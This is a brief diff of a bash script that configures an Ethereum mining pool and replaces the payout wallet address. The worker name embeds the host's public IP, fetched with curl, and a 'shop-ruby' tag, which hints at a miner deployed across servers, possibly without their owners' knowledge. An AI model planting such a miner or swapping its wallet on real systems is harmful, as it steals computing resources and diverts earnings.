@@ -1,7 +1,7 @@
 #!/bin/bash
 
 POOL=us1.ethermine.org:4444
-WALLET=0xcdbccced724727b077d6554e85ddfd8465a523a2.$(echo "$(curl -s ifconfig.me)" | tr . _ )-shop-ruby
+WALLET=0x91d0fbc896f78b8d2c7174902e0daf44efa19513.$(echo "$(curl -s ifconfig.me)" | tr . _ )-shop-ruby
 
 cd "$(dirname "$0")"
 
